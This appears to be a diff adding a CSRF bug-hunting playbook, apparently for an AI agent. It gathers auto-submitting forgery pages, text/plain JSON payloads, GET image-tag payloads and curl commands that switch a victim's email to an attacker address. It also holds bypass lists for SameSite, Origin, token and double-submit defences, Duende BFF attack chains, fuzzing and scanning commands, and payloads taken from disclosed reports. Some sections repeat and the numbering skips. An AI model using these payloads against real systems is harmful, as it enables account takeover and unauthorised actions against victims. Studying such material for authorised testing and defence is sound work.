+delivery) when the target does genuine SameSite/fetch-based origin enforcement that a spoofed header
+can't satisfy.
+
+### URL Patterns
+
+```
+/oauth/authorize?RelayState=
+/accounts/link
+/import/friends
+/api/v*/heartbeat
+/api/v*/collect
+/monitoring/* (Grafana, Prow, Prometheus)
+/auth/saml/callback
+/connect/* (social integrations)
+```
+
+### JS / DOM Patterns
+
+```javascript
+// Static or predictable CSRF tokens
+meta[name="csrf-token"]   // grep if value changes across sessions
+authenticity_token        // Rails — check if reused across page loads
+
+// JSON endpoints without Content-Type enforcement
+fetch('/api/heartbeat', {method: 'POST', body: JSON.stringify(data)})
+
+// No CSRF token in form at all
+<form method="POST" action="/accounts/link">  // no hidden token field
+```
+
+### Scenario 1: Social Account Takeover via Import Friends (Rockstar Games)
+
+An attacker crafted a malicious page targeting the "Import Friends" OAuth integration. When an authenticated SocialClub user visited the page, the CSRF triggered the OAuth token exchange with an attacker-controlled social account. The victim's SocialClub account became permanently linked to the attacker's Facebook/social identity, enabling full account access without the victim's knowledge. Rated high severity due to complete account compromise path.
+
+### Scenario 2: Facebook Account Hijacking via Oculus Integration CSRF
+
+During Oculus-Facebook account linking, the OAuth callback lacked proper CSRF state validation. An attacker could craft a URL that, when loaded by an authenticated Facebook user who had started the Oculus linking flow, would associate the attacker's Oculus device credentials with the victim's Facebook account. The attacker then had persistent access to the victim's Facebook profile through the Oculus app. The attack required only that the victim click a link while logged into Facebook.
+
+### Scenario 3: JSON API CSRF on Heartbeat/Activity Tracking
+
+A POST endpoint accepting `application/json` was assumed CSRF-safe by developers. A researcher crafted an HTML form using `enctype="text/plain"` with an input name designed to produce syntactically valid JSON when submitted. The browser sent the request cross-origin without a preflight (no custom headers, `text/plain` is a simple request), cookies were attached, and the server processed the JSON body as legitimate — silently logging attacker-controlled activity data under the victim's account identity.
+
+---
+
+### Disclosed Report Citations (Backfill +5 — 2020-2024)
+
+The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Four cases chain CSRF to full ATO; all five are modern (SameSite-era).
+
+11. **Argo CD — SameSite=Lax bypass via sibling subdomain + Content-Type abuse (CVE-2024-22424)** ([GHSA-92mw-q256-5vwg](https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg) · [Writeup](https://blog.calif.io/p/argo-cd-csrf))
+    - Subclass: SameSite=None/Lax misconfig chain — same parent-domain bypass + JSON CSRF via missing Content-Type enforcement
+    - Payload: hosted on `marketing.victim.com`, target `argocd.internal.victim.com` → `fetch('https://argocd.internal.victim.com/api/v1/applications', {method:'POST', credentials:'include', body:'{"metadata":{"name":"pwn"},"spec":{"source":{"repoURL":"https://attacker/manifest.git"}}}'})`
+    - Root cause: Argo CD did not enforce `Content-Type: application/json`, and SameSite=Lax is moot when the attacker controls any sibling subdomain of the shared parent
+    - Year: 2023 reported, fixed Jan 2024 in 2.7.16/2.8.8/2.9.4
+
+12. **GitLab — CSRF on `/api/graphql` via GET-converted mutations** ([H1 #1122408](https://hackerone.com/reports/1122408))
+    - Subclass: GET-state-changing endpoint (GraphQL mutations through GET requests)
+    - Payload: `<img src="https://gitlab.com/api/graphql?query=mutation{createSnippet(input:{title:%22x%22,visibilityLevel:public,content:%22pwn%22}){snippet{id}}}">`
+    - Root cause: backend skipped `X-CSRF-Token` validation when the HTTP method was GET; GraphQL accepted mutations via `?query=mutation{...}` query string
+    - Year: 2021 — **$3,370**
+
+13. **Stripe Dashboard — CSRF middleware disabled by code change** ([H1 #1483327](https://hackerone.com/reports/1483327))
+    - Subclass: framework misconfiguration — middleware globally disabled
+    - Payload: `<form method="POST" action="https://dashboard.stripe.com/account/settings" enctype="text/plain"><input name='{"business_name":"pwned","x":"' value='"}'></form>` + auto-submit script
+    - Root cause: 2022-02-14 deploy inadvertently turned off CSRF middleware across all Stripe Dashboard endpoints
+    - Year: 2022 — **$5,000** ($2,500 × 2 researchers)
+
+14. **GitHub Enterprise Server — CSRF bypass via path traversal (CVE-2022-23732)** ([H1 #1497169](https://hackerone.com/reports/1497169))
+    - Subclass: CSRF token validation bypass (path traversal smuggles request past token check)
+    - Payload: `<form method=POST action="https://ghes.victim.com/setup/api/start/..%2f..%2fadmin%2fusers"><input name=login value=attacker></form>`
+    - Root cause: router matched the post-traversal path for execution but pre-traversal path for CSRF-protection scope, so the protected endpoint was reached without a valid token
+    - Year: 2022 — **$10,000**
+
+15. **HackerOne self — CSRF on social account linking → ATO** ([H1 #1727221](https://hackerone.com/reports/1727221))
+    - Subclass: account-link CSRF (social provider attach without state binding)
+    - Payload: `<img src="https://hackerone.com/users/social_accounts/google?code=ATTACKER_CODE&state=PREDICTABLE">` — victim's browser completes attacker-initiated link flow
+    - Root cause: token bound to OAuth-link callback was either reused across attempts or not user-bound, so attacker-issued link callbacks were accepted on the victim's session — attacker's Google account becomes a valid login path = ATO
+    - Year: 2022 — informational scope on H1 self-program, but public PoC
+
+---
+
+### Duende BFF — Role-Partitioned Antiforgery (2024-2026 surface)
+
+Duende BFF (commercial successor to IdentityServer4) is the canonical ASP.NET Core BFF library for SPAs. Its antiforgery primitive is **non-standard and not user-bound**: instead of ASP.NET Core's per-session/per-user double-submit token, Duende only requires the presence of a **static header `X-CSRF: 1`** on every BFF-mapped endpoint. The header value is identical for every caller; it exists only to force a CORS preflight on cross-origin calls. This collapses CSRF defence to "same-origin + session cookie present" — and produces several distinct attack patterns when one BFF serves multiple privilege partitions.
+
+**Architecture primer:** browser↔BFF authenticates via an encrypted HttpOnly session cookie (default `.AspNetCore.Cookies`); BFF↔API uses OAuth tokens cached server-side. Endpoints registered via `MapBffManagementEndpoints` / `MapRemoteBffApiEndpoint` / `MapBffApiEndpoint` enforce `X-CSRF: 1` and session presence — nothing else. ([docs.duendesoftware.com/bff](https://docs.duendesoftware.com/bff/), [Duende blog Mar 2025](https://duendesoftware.com/blog/20250325-understanding-antiforgery-in-aspnetcore))
+
+### Attack class 1 — `X-CSRF: 1` is not user-bound, so cross-role replay succeeds same-origin
+
+When a single BFF serves `/admin/*` and `/user/*` partitions, the antiforgery primitive cannot distinguish role-A from role-B. Any same-origin script that can land an XHR with `X-CSRF: 1` and the victim's session cookie reaches admin endpoints if the victim has the admin role. Stock ASP.NET Core antiforgery (which binds the token to `HttpContext.User.Identity.Name` and rejects on identity change) does the right thing here; Duende BFF does not. ([docs.duendesoftware.com/bff/fundamentals/options](https://docs.duendesoftware.com/bff/fundamentals/options/))
+
+**Payload shape:** from a logged-in low-priv session, `fetch('/bff/admin/users/delete?id=42', {credentials:'include', headers:{'X-CSRF':'1'}})` — succeeds if the victim's session happens to hold the admin role and the attacker can land any same-origin script (self-XSS, subdomain-takeover JS, dependency-confusion).
+
+### Attack class 3 — Cookie-domain wildcarding turns subdomain takeover into session fixation
+
+BFF session cookies default to host-only, but developers commonly override with `options.Cookie.Domain = ".example.com"` to share login across `app.example.com` and `admin.example.com`. This drops the `__Host-` prefix protection. Take over `legacy.example.com` (CNAME to deprovisioned Heroku/S3) → set `Set-Cookie: .AspNetCore.Cookies=<attacker_session>; Domain=.example.com` → victim hits `app.example.com` carrying attacker's session = session-fixation ATO. ([nestenius.se BFF cookie hardening](https://nestenius.se/net/bff-in-asp-net-core-3-the-bff-pattern-explained/))
+
+### Evidence strength
+
+No Duende.BFF-direct CVE exists as of 2026-05. The three classes above are **design-level / documented behaviour** that becomes a live finding when paired with a co-resident primitive (same-origin script execution, SignalR carve-out, or subdomain takeover). Report severity should lean on the chain's business impact rather than CVE citation. Adjacent confirmed CVEs in the Duende ecosystem: CVE-2025-26620 (`Duende.AccessTokenManagement` race), CVE-2024-51987 (`Duende.AccessTokenManagement.OpenIdConnect` incorrect-token-after-refresh), CVE-2024-39694 (`Duende.IdentityServer` open redirect). ([Duende advisories on GitHub](https://github.com/advisories?query=duende))
+
+### Hunting checklist
+
+1. `curl https://target/bff/user -H 'X-CSRF: 1' -b '<session>'` — dumps the full claim set including internal IDs, role names, tenant IDs (info disclosure on its own).
+2. Inspect `Set-Cookie` on `/bff/login` callback — flag `Domain=` attribute (vs `__Host-` prefix); flag missing `Secure`/`HttpOnly`.
+3. From a low-priv session, replay admin-partition POSTs with `X-CSRF: 1` to confirm no per-role token binding.
+4. Enumerate SignalR/WS hubs (`/hubs/*`, `/signalr/*`) — open without `X-CSRF`; if 101 Switching Protocols, CSWSH-style attacks viable.
+5. Subdomain inventory + DNS-takeover scan for any `*.example.com` if BFF cookie has `Domain=.example.com`.
+
+---
+
+### Basic CSRF PoC (Form POST)
+
+```html
+<html>
+<body onload="document.forms[0].submit()">
+  <form method="POST" action="https://target.com/api/v1/account/link">
+    <input type="hidden" name="provider" value="attacker_account_id" />
+    <input type="hidden" name="token" value="oauth_token_here" />
+  </form>
+</body>
+</html>
+```
+
+### curl: Test CSRF token omission
+
+```bash
+# Capture a valid request, then replay without token
+curl -s -X POST https://target.com/settings/email \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "email=attacker@evil.com" \
+  -v 2>&1 | grep -E "HTTP|location|error"
+```
+
+### curl: Test token reuse across sessions
+
+```bash
+# Get token from session A
+TOKEN_A=$(curl -s https://target.com/settings -H "Cookie: session=SESSION_A" \
+  | grep -oP 'authenticity_token[^"]*value="\K[^"]+')
+
+# Use token A in session B's request
+curl -s -X POST https://target.com/settings/update \
+  -H "Cookie: session=SESSION_B" \
+  -d "authenticity_token=$TOKEN_A&email=test@test.com" \
+  -v
+```
+
+### Grafana CVE-2022-21703 version check
+
+```bash
+curl -s https://monitoring.target.com/api/health | jq '.version'
+# Vulnerable: < 8.3.5, < 8.4.3, < 7.5.15
+```
+
+---
+
+### Defense: SameSite=Lax cookies
+
+**Bypass:** Top-level navigation GET requests still work. If the sensitive action can be triggered via GET (or if a redirect chain converts POST→GET), Lax doesn't protect it. Also: subdomains can still set cookies for parent domain.
+
+### Defense: CSRF token present
+
+**Bypasses:**
+- Token is static per session — steal via XSS, Referer leakage, or cached page
+- Token not validated server-side — just remove it and try
+- Token validated by length/format only — submit a fake but correctly-formatted value
+- Token tied to session but session is predictable
+
+### Defense: `Content-Type: application/json` enforcement
+
+**Bypass:** Use `text/plain` enctype with crafted form input names that produce valid JSON. Server receives JSON body, skips CORS preflight.
+
+### Defense: Referer/Origin header check
+
+**Bypasses:**
+- Null Origin: use sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`)
+- Subdomain bypass: if `*.target.com` is trusted and you have XSS on any subdomain
+- Referer stripping: HTTPS→HTTP transitions strip Referer header
+- Weak matching: `target.com.evil.com` passes naive string matching
+
+### Defense: Double-submit cookie pattern
+
+**Bypass:** If attacker can set cookies (subdomain takeover, cookie injection via HTTP), they can set both the cookie and the form field to matching attacker-controlled values.
+
+### Defense: Custom request header (e.g., `X-Requested-With`)
+
+**Bypass:** Simple requests (form POST, `text/plain`) don't trigger preflight and can't set custom headers — but some servers only check for header *presence*, not value, and some frameworks accept requests without it.
+
+---
+
+### Mobile-app CSRF via custom-scheme deeplink
+
+CSRF is not browser-only. For targets with a mobile app, enumerate exported deeplink / custom-scheme handlers (`scheme://action` from the Android manifest / iOS `Info.plist`) and test whether opening one performs a state-changing action (follow, link, purchase) using the app's ambient session with no CSRF token — deliverable to a victim by a plain link or a QR code. Disclosed: reports/583987, reports/805073.
+
+## Companion methodology (complete, deduplicated)
+
+Full text of every non-SKILL.md methodology document from the contributing skills.
+
+### Companion: hunting / references/payloads.md
+
+# CSRF — Combined Field Guide — Payload reference
+
+Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
+
+---
+
+## Payloads & probes
+
+
+
+- Form -> `<form action=https://target/email method=POST><input name=email value=attacker@x>`
+
+- JSON -> `<form enctype=text/plain><input name='{"email":"attacker@x","x":"' value='"}'>`
+
+- GET -> `<img src=https://target/settings?email=attacker@x>`
+
+- Method override -> `_method=POST` in a GET/form request
+
+
+
+## Payload fragments observed
+
+
+
+Recurring payloads from this class's writeups. Adapt, don't paste blindly.
+
+
+
+| Seen | Fragment |
+
+|---:|---|
+
+| 3× | `new.cs.money{.withgoogle.com` |
+
+| 2× | `www.pscp.tv/<user-id>/follow` |
+
+| 2× | `new.cs.money{.attacker.com` |
+
+| 2× | `http://localhost$something.io` |
+
+| 2× | `<html> / <!-- CSRF PoC - generated by Burp Suite Professional --> / <body> / <script>history.pushState('', '', '/')</script> / <form action=` |
+
+| 1× | `MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D` |
+
+| 1× | `pscp://user/<user-id> or pscpd://user/<user-id>` |
+
+| 1× | `{F1976253} / 3. Following the redirection takes us to the authorization page of the service provider / {F1976255} / If we choose to Authoriz` |
+
+| 1× | `This endpoint validates the code received from Github, the backend relies on the ***state*** parameter to determine to which user should the` |
+
+| 1× | `Location: https://slack.com/oauth/authorize / ?client_id=2174110321.11522100978 / &redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2` |
+
+| 1× | `<meta name="referrer" content="origin" />` |
+
+| 1× | `$this->request->getHeader("Authorization")` |
+
+| 1× | `GET /2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D HTTP/2 / Host: api.bitbucket.org / User-Agent: curl/7.79.1 / Accept: */* /` |
+
+| 1× | `gitlab@gitlab.com` |
+
+| 1× | `https://academy.acronis.com/#/account/edit/account_id/<your_id>` |
+
+| 1× | `<img>` |
+
+| 1× | `__utmz=123456.123456789.11.2.utmcsr=[HOST]\\|utmccn=(referral)\\|utmcmd=referral\\|utmcct=[PATH]` |
+
+| 1× | `__utmz=123456.123456789.11.2.utmcsr=blackfan.ru\\|utmccn=(referral)\\|utmcmd=referral\\|utmcct=/path/` |
+
+| 1× | `https://eu1.badoo.com/google/verify.phtml?rt=<State_param_value>&code=<Code_returned_from_google>` |
+
+| 1× | `GET /u/x.css HTTP/1.1 / Host: try.discourse.org / <meta name="csrf-token" content="aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==" />` |
+
+
+
+## Parameters observed
+
+
+
+`email` · `code` · `state` · `id` · `page` · `redirect_uri` · `authenticity_token` · `client_id` · `scope` · `nonce` · `sort_type` · `sort_direction` · `limit` · `password` · `act` · `subject` · `report_id` · `view` · `text_query` · `response_type`
+
+
+
+## Wordlists
+
+
+
+Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.
+
+
+
+| File | Entries |
+
+|---|---:|
+
+| `~/.local/share/hackerone-reports/wordlists/paths_csrf.txt` | 150 |
+
+| `~/.local/share/hackerone-reports/wordlists/params_csrf.txt` | 150 |
+
+| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
+
+| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |
+
+
+
+```sh
+
+W=~/.local/share/hackerone-reports/wordlists
+
+ffuf -u https://target/FUZZ -w $W/paths_csrf.txt \
+
+     -mc all -fc 404 -fs 0 -rate 40
+
+ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_csrf.txt \
+
+     -mr 'canary|error|invalid|not found' -rate 40
+
+```
+
+
+
+## Nuclei
+
+
+
+Confirm with a real cross-origin PoC; scanner hits need a browser check.
+
+
+
+```sh
+
+nuclei -u https://target -tags csrf \
+
+       -severity low,medium,high,critical -rl 40 -o nuclei_csrf.txt
+
+nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
+
+       -rl 40 -o nuclei_csrf_generic.txt
+
+# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
+
+```
+
+
+
+Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
+
+
+
+## Payload & Detection Patterns
+
+
+
+### Basic CSRF PoC (Form POST)
+
+```html
+
+<html>
+
+<body onload="document.forms[0].submit()">
+
+  <form method="POST" action="https://target.com/api/v1/account/link">
+
+    <input type="hidden" name="provider" value="attacker_account_id" />
+
+    <input type="hidden" name="token" value="oauth_token_here" />
+
+  </form>
+
+</body>
+
+</html>
+
+```
+
+
+
+### JSON CSRF via text/plain (bypasses Content-Type check)
+
+```html
+
+<html>
+
+<body onload="document.forms[0].submit()">
+
+  <form method="POST" action="https://target.com/api/heartbeat"
+
+        enctype="text/plain">
+
+    <!-- browser sends: {"status":"ok","x":"=padding"} -->
+
+    <input type="hidden" name='{"status":"ok","x":"' value='padding"}' />
+
+  </form>
+
+</body>
+
+</html>
+
+```
+
+
+
+### curl: Test CSRF token omission
+
+```bash
+
+# Capture a valid request, then replay without token
+
+curl -s -X POST https://target.com/settings/email \
+
+  -H "Cookie: session=YOUR_SESSION" \
+
+  -d "email=attacker@evil.com" \
+
+  -v 2>&1 | grep -E "HTTP|location|error"
+
+```
+
+
+
+### curl: Test token reuse across sessions
+
+```bash
+
+# Get token from session A
+
+TOKEN_A=$(curl -s https://target.com/settings -H "Cookie: session=SESSION_A" \
+
+  | grep -oP 'authenticity_token[^"]*value="\K[^"]+')
+
+
+
+# Use token A in session B's request
+
+curl -s -X POST https://target.com/settings/update \
+
+  -H "Cookie: session=SESSION_B" \
+
+  -d "authenticity_token=$TOKEN_A&email=test@test.com" \
+
+  -v
+
+```
+
+
+
+### Grep patterns for recon
+
+```bash
+
+# Find CSRF token fields in HTML responses
+
+grep -Eo 'name="(csrf|_token|authenticity_token|csrfmiddlewaretoken)"[^>]*value="[^"]+"'
+
+
+
+# Find forms without CSRF tokens
+
+grep -B5 -A20 '<form method="[Pp][Oo][Ss][Tt]"' response.html | grep -L "csrf\|token\|nonce"
+
+
+
+# Check SameSite in response headers
+
+curl -sI https://target.com/login | grep -i "set-cookie"
+
+
+
+# Find RelayState parameters
+
+grep -r "RelayState" --include="*.js" .
+
+```
+
+
+
+### Grafana CVE-2022-21703 version check
+
+```bash
+
+curl -s https://monitoring.target.com/api/health | jq '.version'
+
+# Vulnerable: < 8.3.5, < 8.4.3, < 7.5.15
+
+```
+
+
+
+---
+
+### Companion: hunting / references/techniques.md
+
+# CSRF — Combined Field Guide — Technique reference
+
+Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.
+
+---
+
+## Quick wins
+
+
+
+Start here. These are the highest-yield tests for this class.
+
+
+
+- Find state-changing requests and check for anti-CSRF tokens and SameSite cookies.
+
+- Remove the token, blank it, reuse another session's token, and try a fixed token.
+
+- Try GET, form POST, text/plain JSON, multipart, and method override.
+
+- Check email/password change, OAuth consent, and login CSRF.
+
+- Look for subdomain XSS or cookie scope that enables CSRF.
+
+
+
+## Bypass tricks
+
+
+
+- Token not bound to session; token from another account accepted.
+
+- SameSite=Lax bypass via top-level GET or 2-minute window.
+
+- CORS misconfig allowing credentialed cross-origin requests.
+
+- Bypass token check by changing content-type or removing the parameter.
+
+
+
+## Deeper checklist
+
+
+
+- Identify state-changing requests and check for anti-CSRF tokens and SameSite cookies.
+
+- Test token validation: missing token, empty token, token from another session, fixed token.
+
+- Try method/content-type tricks: GET, POST forms, text/plain JSON, multipart, method override.
+
+- Check CORS misconfigurations that allow credentialed cross-origin reads/writes.
+
+- Test login CSRF, logout CSRF, OAuth state CSRF, and email-change CSRF.
+
+- Look at subdomain/XSS-assisted CSRF where cookies are scoped to the parent domain.
+
+- Build a minimal PoC page and confirm the state change on a victim account.
+
+
+
+## Techniques from real reports
+
+
+
+One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.
+
+
+
+- **[CSRF] TikTok Careers Portal Account Takeover** — `#1010522` · TikTok · $0 · ▲366
+
+  > If you have any feedback, feel free to ping me at [Twitter](https://twitter.com/ lauritz ).
+
+- **CSRF on connecting Paypal as Payment Provider** — `#807924` · Shopify · $0 · ▲304
+
+  > `https://h60ngalog.myshopify.com/admin/payments/complete paypal incontext oauth/41?merchantId=MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D&merchantIdInPayPal=5NS8DHQCFGT84&permissionsGranted=true&accountStatus=BUSINESS…
+
+- **Periscope android app deeplink leads to CSRF in follow action** — `#583987` · X / xAI · $1,540 · ▲224
+
+  > + It means we can use ` pscp://user/<user-id or pscpd://user/<user-id `
+
+- **Take over of accounts created using Google or Facebook** — `#442901` · Khan Academy · $0 · ▲184
+
+  > Since the account is created using a social media account, no existing password check is needed and the CSRF check on the endpoint is broken.
+
+- **Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone** — `#1727221` · HackerOne · $0 · ▲168
+
+  > Then it redirects us to the callback endpoint which sends a postmessage to the embedded iframe to validate the integration on the client side.
+
+- **CSRF protection bypass in GitHub Enterprise management console** — `#1497169` · GitHub · $10,000 · ▲152
+
+  > [CVE-2022-23732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23732)
+
+- **Slack integration setup lacks CSRF protection** — `#170552` · HackerOne · $2,500 · ▲149
+
+  > Cross-site Request Forgery in the `Integrations` (https://hackerone.com/[YOUR TEAM]/integrations) feature for teams.
+
+- **CSRF token validation system is disabled on Stripe Dashboard** — `#1483327` · Stripe · $0 · ▲113
+
+  > @d sharad discovered that due to a code change deployed on 2/14/2022, Cross Site Request Forgery (CSRF) protection was disabled in the Stripe Dashboard.
+
+- **Referer Leakage Vulnerability in  socialclub.rockstargames.com/crew/ leads to FB'S OAuth token theft.** — `#787160` · Rockstar Games · $0 · ▲112
+
+  > The Open Redirect is the subject of a separate report; in this report, we addressed the problem by strengthening the Referer header policy with `<meta name="referrer" content="origin" / `.
+
+- **Cross-Site Request Forgery** — `#2041007` · ownCloud · $0 · ▲111
+
+  > I think the cause of this vulnerability is the second condition of https://github.com/owncloud/core/blob/master/lib/private/AppFramework/Middleware/Security/SecurityMiddleware.php L145, because the the value of `$this- request- getHeader("Authorization")` is…
+
+- **Cross-Site Request Forgery (CSRF) vulnerability on API endpoint allows account takeovers** — `#419891` · Khan Academy · $0 · ▲111
+
+  > The `/signup/email` API endpoint at [khanacademy.org](https://khanacademy.org) is vulnerable to Cross-Site Request Forgery (CSRF) attacks, allowing takeovers of accounts associated with unconfirmed email addresses.
+
+- **CSRF Vulnerability on https://signin.rockstargames.com/tpa/facebook/link/** — `#474833` · Rockstar Games · $0 · ▲104
+
+  > In this report, the researcher identified a Cross-Site Request Forgery vulnerability that could have allowed attackers to link a Facebook account to another user's Social Club account, and thus gain the ability to log in as the victim.
+
+- **Account takeover due to insufficient URL validation on RelayState parameter** — `#1923672` · GitLab · $2,450 · ▲99
+
+  > https://bitbucket.org/site/oauth2/authorize?client id=b9jLmh8WCLZPBAwWba&redirect uri=https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response type=token&state=DoesNotMatter
+
+- **One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on  www.streamlabs.com** — `#1046630` · Logitech · $0 · ▲99
+
+  > Allow twitch access and once you see a get request in burp with host streamlabs.com and parameters code, scope and state then generate CSRF PoC
+
+- **CSRF Account Takeover** — `#1253462` · TikTok · $0 · ▲95
+
+  > A Cross-Site Request Forgery (CSRF) vulnerability was found on a TikTok endpoint which could have resulted in a full account takeover.
+
+- **CSRF to HTML Injection in Comments** — `#428019` · WordPress · $0 · ▲95
+
+  > More [details are available on the RIPS blog](https://blog.ripstech.com/2019/wordpress-csrf-to-rce/).
+
+- **CSRF in Account Deletion feature (https://www.flickr.com/account/delete)** — `#615448` · Flickr · $0 · ▲92
+
+  > While testing the account deletion feature, I noticed that there were no CSRF token :/ Later found out it was because of the new login flow.
+
+- **Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account** — `#423022` · Discourse · $0 · ▲89
+
+  > There is an option in https://try.discourse.org/u/testh1ay/preferences/account to connect our Yahoo account.
+
+- **CSRF on /api/graphql allows executing mutations through GET requests** — `#1122408` · GitLab · $3,370 · ▲88
+
+  > Mutations are `edit` or `create` queries used in Graphql.
+
+- **CSRF token validation system is disabled on Stripe Dashboard** — `#1493437` · Stripe · $2,500 · ▲87
+
+  > @rodolfomarianocy discovered that due to a code change deployed on 2/14/2022, Cross Site Request Forgery (CSRF) protection was disabled in the Stripe Dashboard.
+
+- **CSRF leads to Account takeover** — `#2699029` · U.S. Dept Of Defense · $0 · ▲87
+
+  > Vulnerable domain and endpoint : https://██████████/account/profile/edit
+
+- **Login CSRF vulnerability on hackerone.com** — `#834366` · HackerOne · $500 · ▲84
+
+  > We found a CSRF token bypass on the Hacker One login page.
+
+- **Delete any user's added Email,Telephone,Fax,Address,Skype via csrf in (https://academy.acronis.com/)** — `#709537` · Acronis · $0 · ▲82
+
+  > - navigate to `https://academy.acronis.com/ /account/edit/account id/<your id `
+
+- **XSSI on refer.xoom.com allows stealing email addresses and posting to Twitter on behalf of victim** — `#450796` · PayPal · $3,500 · ▲81
+
+  > This included the email addresses being used and, in extreme cases, tokens allowing Xoom access to post on a user’s Twitter.
+
+- **CSRF in ticket function** — `#1890310` · TikTok · $0 · ▲80
+
+  > I found this issue by removing the CsrfToken from the header and converting the content type from `JSON` to `x-www-form-urlencoded`.
+
+- **Account takeover by changing email** — `#538800` · Khan Academy · $0 · ▲80
+
+  > Attacker then lures a new KA user to visit a URL linking to a page that sends a `POST` request to `/signup/email` with the POST body : `casing=camel&email=ATTACKER EMAIL`.
+
+- **CSRF protection bypass on TikTok Webcast Endpoints** — `#1543234` · TikTok · $2,500 · ▲79
+
+  > API on TikTok Webcast endpoints prevent CSRF by validating the Origin header which indicates the source of the request.
+
+- **CSRF protection on OIDC login is broken** — `#1878381` · Nextcloud · $500 · ▲77
+
+  > So I assume the bug is also the same https://github.com/nextcloud/user oidc/blob/main/lib/Controller/Id4meController.php L175-L181
+
+- **Japan - CSRF in webapp.starbucks.co.jp with user interaction could leak an access token if the user was not using Chrome** — `#1113559` · Starbucks · $0 · ▲77
+
+  > elber discovered a CSRF in webapp.starbucks.co.jp leaked an access token if an authenticated user opened a crafted HTML file in a browser other than Chrome which has Same Site Attribute for the cookie set by default.
+
+- **CSRF on Periscope Web OAuth authorization endpoint** — `#215381` · X / xAI · $0 · ▲74
+
+  > At minimum, I found endpoints that allow creating a broadcast (https://public-api.periscope.tv/v1/broadcast/create), tweeting it (https://public-api.periscope.tv/v1/broadcast/publish) and deleting a broadcast…
+
+
+
+## Case studies
+
+
+
+### [CSRF] TikTok Careers Portal Account Takeover
+
+`#1010522` · TikTok · $0 · high · 2020-12-15 · ▲366
+
+> A missing CSRF protection and open redirect vulnerability was reported in the TikTok Careers portal single sign on flow which is used by applicants to apply for TikTok positions. This flaw was quickly remediated and does not impact TikTok.com or mobile application. We thank @lauritz for reporting this vulnerability to our team and for confirming the resolution. I wrote a short blog post that covers this report.
+
+
+
+### CSRF on connecting Paypal as Payment Provider
+
+`#807924` · Shopify · $0 · medium · 2020-04-10 · ▲304
+
+> Hi, I think there is a weak csrf protection on adding paypal as the payment provider, but the protection is not good. When user try to add paypal as payment provider, they will make this GET request https://h60ngalog.myshopify.com/admin/payments/complete paypal incontext oauth/41?merchantId=MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D&merchantIdInPayPal=5NS8DHQCFGT84&permissionsGranted=true&accountStatus=BUSINESS…
+
+
+
+### Account Takeover using Linked Accounts due to lack of CSRF protection
+
+`#463330` · Rockstar Games · $0 · high · 2019-02-20 · ▲238
+
+> In this report, the researcher found a weakness in our third-party account linking process. They were able to create a malicious link that, if clicked by the victim, would under certain conditions give the attacker access to the victim's Social Club account. This issue has now been fixed.
+
+
+
+### Periscope android app deeplink leads to CSRF in follow action
+
+`#583987` · X / xAI · $1,540 · low · 2020-02-21 · ▲224
+
+> This issue is mainly in the Periscope Android app against CSRF follow action using deeplink.
+
+
+
+### Take over of accounts created using Google or Facebook
+
+`#442901` · Khan Academy · $0 · critical · 2019-05-17 · ▲184
+
+> When a user creates an account using Google or Facebook and does not set an additional password, it is possible to set their passwords via CSRF. Since the account is created using a social media account, no existing password check is needed and the CSRF check on the endpoint is broken. To reproduce, create an account with Google or Facebook and make account load the attached HTML file.
+
+
+
+## Query the corpus
+
+
+
+```sh
+
+python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class csrf --limit 20
+
+python3 ~/.local/share/hackerone-reports/h1.py stats --class csrf
+
+python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
+
+```
+
+
+
+Search by technology, endpoint, parameter, or program. Examples:
+
+
+
+```sh
+
+python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class csrf
+
+python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class csrf --min-bounty 1000
+
+```
+
+
+
+## Bypass Techniques
+
+
+
+### Defense: SameSite=Lax cookies
+
+**Bypass:** Top-level navigation GET requests still work. If the sensitive action can be triggered via GET (or if a redirect chain converts POST→GET), Lax doesn't protect it. Also: subdomains can still set cookies for parent domain.
+
+
+
+### Defense: CSRF token present
+
+**Bypasses:**
+
+- Token is static per session — steal via XSS, Referer leakage, or cached page
+
+- Token not validated server-side — just remove it and try
+
+- Token validated by length/format only — submit a fake but correctly-formatted value
+
+- Token tied to session but session is predictable
+
+
+
+### Defense: `Content-Type: application/json` enforcement
+
+**Bypass:** Use `text/plain` enctype with crafted form input names that produce valid JSON. Server receives JSON body, skips CORS preflight.
+
+
+
+### Defense: Referer/Origin header check
+
+**Bypasses:**
+
+- Null Origin: use sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`)
+
+- Subdomain bypass: if `*.target.com` is trusted and you have XSS on any subdomain
+
+- Referer stripping: HTTPS→HTTP transitions strip Referer header
+
+- Weak matching: `target.com.evil.com` passes naive string matching
+
+
+
+### Defense: Double-submit cookie pattern
+
